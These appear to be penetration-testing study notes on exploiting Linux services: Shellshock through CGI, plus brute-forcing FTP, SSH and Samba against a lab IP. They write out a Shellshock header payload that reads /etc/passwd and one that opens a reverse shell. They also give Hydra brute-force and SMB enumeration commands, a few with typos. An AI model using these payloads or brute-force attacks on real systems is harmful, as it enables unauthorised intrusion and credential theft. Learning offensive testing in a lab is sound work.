# Exploiting Linux Vulnerabilities
### ShellShock 
-  CVE-2014-6271 Vulnerability (Shellshock)
- to execute remote arbitrary commands via bash
- not common anymore
- caused in bash
- commands after () { :; };. are being executed
- exploitation
	- need to locate an input vector or script that allows you to communicate with bash
	- in Apache web server, we can utilize any legitimate CGI scripts accessible on web server
- manually and Automated
- **Exploitation process**
	- manually
		- `nmap -sV 10.10.10.10`
		- `nmap -sV 10.10.10.10 --script=http-shellshok --scritp-args "http-shellshock.uri=/gettime.cgi"`
		-  open the web
		- open burp suit
		- replace the User-Agent - `() { :; }; echo;echo;  /bin/bash -c 'cat /etc/passwd'`
		- to get a reverse shell follow the steps
		- `nc -nvlp 1234`
		- replace the User-Agent - `() { :; }; echo;echo;  /bin/bash -c 'bash -i>&/dev/tcp/yourip:1234 0>&1'`
	- with Metasploit
		- Search shellshock
		- use 5
		- configure options, rhosts, TARGETURI
		- run
### Exploiting FTP
- File Transfer Protocol
- TCP 21
- username and passowrd for authentication - can be brute-forced
- sometimes configured to allow anonymous access
- **Exploitation**
	- `nmap -sV 10.10.10.10`
	- using Hydra for brute-force
		- `hydra -L <path to user list> -P <path to passlist> 10.10.10.10 -t 4 ftp `
### Exploiting SSH
- Secure Shell
- used for remote access to servers and systems
- TCP port 22
- authentication
	- username & password
	- key based
- the username & password can be brute-forced
- **Exploitation**
- `nmap -sV 10.10.10.10`
- brute-force with hydra
	- `hydra -L <path to user list> -P <path to pass list> 10.10.10.10  -t 4 ssh`
- `ssh username@10.10.10.10` -> connect to the system with obtained credentials during the brute-force
### Exploiting SAMBA
- Linux implementation of SMB
- network file sharing protocol
- TCP port 445, on top of NetBIOS por t139
- allows windows systems to access Linux shares and devices
- utilizes username & password authintication
- can be brute-forced
- SMBMap tool to enumerate SAMBA ...
- smbclient - provide is with ftp like interface
- **Exploitation Process**
	- `nmap -sV 10.10.10.10`
	- brute force using hydra
		- $`hydra -l admin -P <patht to pass list>  10.10.10.10 smb`
	- connect via SMBMap
		- `smbmap -H 10.10.10.10 -u admin -u admin -p password1`
		- `smbclient //10.10.10.10/<share name> -U admin`
	- run commands on the system/server
	- using enum4linux
		- `enum4linux -a 10.10.10.10`
		- `enum4linux -a -u admin -p password1 10.10.10.10`
